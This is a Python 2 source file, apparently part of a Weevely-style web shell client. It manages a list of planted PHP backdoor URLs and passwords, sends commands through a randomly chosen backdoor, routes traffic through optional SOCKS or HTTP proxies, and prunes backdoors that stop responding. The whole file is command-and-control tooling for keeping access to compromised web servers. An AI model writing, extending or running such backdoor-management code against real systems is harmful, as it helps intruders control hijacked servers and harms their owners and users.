from core.channels.stegaref.stegaref import StegaRef
from core.weexceptions import ChannelException
from urllib2 import HTTPError, URLError
from core import messages
from core.loggers import log, dlog
import utils
import socks
import sockshandler
import urllib2
import re
import random
import os

url_dissector = re.compile(
    r'^(https?|socks4|socks5)://'  # http:// or https://
    # domain...
    r'((?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'
    r'localhost|'  # localhost...
    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
    r':(\d+)?'  # optional port
    r'(?:/?|[/?]\S+)$',
    re.IGNORECASE
)

class Channel:

    def __init__(self, channel_name, session):
        """
        Import and instanciate dynamically the channel.

        Given the channel object Mychannel, this should be placed
        in module core.channels.mychannel.mychannel.
        """

        module_name = channel_name.lower()

        try:
            # Import module
            module = __import__(
                'core.channels.%s.%s' %
                (module_name, module_name), fromlist=["*"])

            # Import object
            channel_object = getattr(module, channel_name)
        except:
            raise ChannelException(messages.channels.error_loading_channel_s % (channel_name))

        self.session = session
        self.channel_name = channel_name
	self.chanFile = os.path.join(os.path.dirname(self.session['path']),"channels")

        # Create channel instance
        self.channel_loaded = []
	self.add_channel(
            self.session['url'],
            self.session['password']
        )
	self.add_to_chanFile(self.session['url'],self.session['password'])

    def clear_channels(self):
	self.channel_loaded=[]

    @staticmethod
    def add_to_chan(url,password,chanFile):
	ocontent=""
	if os.path.exists(chanFile) :
	        with open(chanFile,"r") as f:
			ocontent=f.read()
	ocontent=ocontent.split("\n")
	nl=url+" "+password
	if not nl in ocontent :
		ocontent.append(nl)
	with open(chanFile,"w+") as f:
		f.write("\n".join(ocontent))

    def add_to_chanFile(self,url,password) :
	Channel.add_to_chan(url,password,self.chanFile)

    def remove_from_chanFile(self,url) :
	ocontent=""
	ncontent=[]
	print "[!!!] Removing unreachable backdoor "+url
        with open(self.chanFile,"r") as f:
		ocontent=f.read()
	for line in ocontent.split('\n') :
		if len(line) == 0 or not ' ' in line :
			continue
		lurl = line.split(' ')[0]
		if lurl != url :
			ncontent.append(line)
	with open(self.chanFile,"w") as f:
		f.write("\n".join(ncontent))

    def add_channel(self,url,password):
	channel_name = self.channel_name
        module_name = channel_name.lower()
        try:
            # Import module
            module = __import__(
                'core.channels.%s.%s' %
                (module_name, module_name), fromlist=["*"])

            # Import object
            channel_object = getattr(module, channel_name)
        except:
            raise ChannelException(messages.channels.error_loading_channel_s % (channel_name))

        self.channel_loaded.append(channel_object(url,password))
	
    def _get_proxy(self):

        url_dissected = url_dissector.findall(
            self.session['proxy']
        )

        if url_dissected and len(url_dissected[0]) == 3:
            protocol, host, port = url_dissected[0]
            if protocol == 'socks5':
                return (socks.PROXY_TYPE_SOCKS5, host, int(port))
            if protocol == 'socks4':
                return (socks.PROXY_TYPE_SOCKS4, host, int(port))
            if protocol.startswith('http'):
                return (socks.PROXY_TYPE_HTTP, host, int(port))

        return None, None, None

    def _additional_handlers(self):

        handlers = []

        if self.session.get('proxy'):
            protocol, host, port = self._get_proxy()

            if protocol and host and port:
                handlers.append(
                    sockshandler.SocksiPyHandler(
                        protocol,
                        host,
                        port
                    )
                )
            else:
                raise ChannelException(messages.channels.error_proxy_format)

        return handlers

    def update_channels(self):
		self.clear_channels()
		with open(self.chanFile,"r") as f :
			content=f.read()
		for line in content.split("\n") :
			#print(line)
			if len(line) == 0 :
				continue
			url=line.split()[0]
			password=line.split()[1]
			self.add_channel(url,password)

    def send(self, payload):

        response = ''
        code = 200
        error = ''

        human_error = ''

	self.update_channels()
	chan = random.choice(self.channel_loaded)
        try:
            response = chan.send(
                payload,
                self._additional_handlers()
            )
        except socks.ProxyError as e:
            if e.socket_err.errno:
                code = e.socket_err.errno
            if e.msg:
                error = str(e.msg)

            human_error = messages.module_shell_php.error_proxy

        except HTTPError as e:
            if e.code:
                code = e.code
            if e.reason:
                error = str(e.reason)

            if code == 404:
                human_error = messages.module_shell_php.error_404_remote_backdoor
		print str(chan)
		self.remove_from_chanFile(chan.url)
            elif code == 500:
                human_error = messages.module_shell_php.error_500_executing
            elif code != 200:
                human_error = messages.module_shell_php.error_i_executing % code

        except URLError as e:
            code = 0
            if e.reason:
                error = str(e.reason)

            human_error = messages.module_shell_php.error_URLError_network

        if response:
            dlog.info('RESPONSE: %s' % repr(response))
        else:
            command_last_chars = utils.prettify.shorten(
                                    payload.rstrip(),
                                    keep_trailer = 10
                                )
            if (
                command_last_chars and
                command_last_chars[-1] not in ( ';', '}' )
                ):
                log.warn(messages.module_shell_php.missing_php_trailer_s % command_last_chars)

        if error or human_error:
            log.debug('[ERR] %s [%s]' % (error, code))
            log.warn(human_error)

        return response, code, error
